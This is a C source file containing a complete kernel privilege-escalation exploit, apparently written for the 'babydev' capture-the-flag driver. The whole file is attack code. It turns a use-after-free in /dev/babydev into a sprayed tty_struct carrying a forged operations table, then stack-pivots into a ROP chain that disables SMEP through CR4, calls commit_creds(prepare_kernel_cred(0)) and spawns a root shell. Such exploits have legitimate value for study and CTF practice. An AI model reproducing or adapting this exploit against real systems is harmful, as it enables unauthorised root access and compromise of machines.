// musl-gcc -Os -oexp -static -lutil exp.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define C_SETSIZE 0x10001

void hexdump(unsigned char* buf, size_t size) {
    int i,j;
    for (i = 0;i < size;i += 16)
    {
        printf("%08x:", i);
        for (j = i;j < size && j < i + 16;j++)
        {
            printf(" %02x", buf[j]);
        }
        puts("");
    }
}

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = 0xffffffff810a1420;
_prepare_kernel_cred prepare_kernel_cred = 0xffffffff810a1810;

unsigned long native_write_cr4 = 0xffffffff810635b0;
unsigned long xchgeaxesp = 0xffffffff81007808;
unsigned long poprdiret = 0xffffffff813e7d6f;
unsigned long iretq = 0xffffffff8181a797;
unsigned long swapgs = 0xffffffff81063694;

unsigned long user_cs, user_ss, user_rflags;

static void save_state() {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void get_root_payload(void) {
    commit_creds(prepare_kernel_cred(0));
}

void get_shell() {
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

struct tty_operations {
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};

struct tty_operations fake_ops;
struct tty_operations *p_fake_ops;
char fake_procfops[1024];

int main() {
    save_state();
    memset(&fake_ops, 0, sizeof(fake_ops));
    memset(fake_procfops, 0, sizeof(fake_procfops));
    fake_ops.proc_fops = &fake_procfops;
    fake_ops.ioctl = xchgeaxesp;
    p_fake_ops = &fake_ops;

    char buf[0x1000];
    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    ioctl(fd1, C_SETSIZE, 0x2e0);
    ioctl(fd2, C_SETSIZE, 0x2e0);
    close(fd1);
    /*
    int pty_master, pty_slave;
    if (openpty(&pty_master, &pty_slave, NULL, NULL, NULL)==-1) {
        perror("openpty");
        exit(-1);
    }
    */
    int i,ttyfd[10];
    for (i=0;i<10;i++) {
        ttyfd[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        if (ttyfd[i]==-1)
            printf("Error on %d", i);
    }
    read(fd2, buf, 0x20);
    //hexdump(buf, 0x20);
    printf("running\n");
    memcpy(buf+0x18, &p_fake_ops, 8);
    //hexdump(buf, 0x20);
    write(fd2, buf, 0x20);

    unsigned long lower_addr = xchgeaxesp & 0xFFFFFFFF;
    unsigned long base = lower_addr & ~0xFFF;
    if (mmap(base, 0x10000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base) {
        perror("mmap");
        exit(1);
    }
    unsigned long rop_chain[] = {
        poprdiret,
        0x6f0, // cr4 with smep disabled
        native_write_cr4,
        get_root_payload,
        swapgs,
        0, // dummy
        iretq,
        get_shell,
        user_cs, user_rflags, base + 0x10000, user_ss};
    memcpy(lower_addr, rop_chain, sizeof(rop_chain));

    //ioctl(pty_master, 0, 0);
    for (i=0;i<10;i++)
        if (ttyfd[i]!=-1)
            ioctl(ttyfd[i], 0, 0);
    return 0;
}
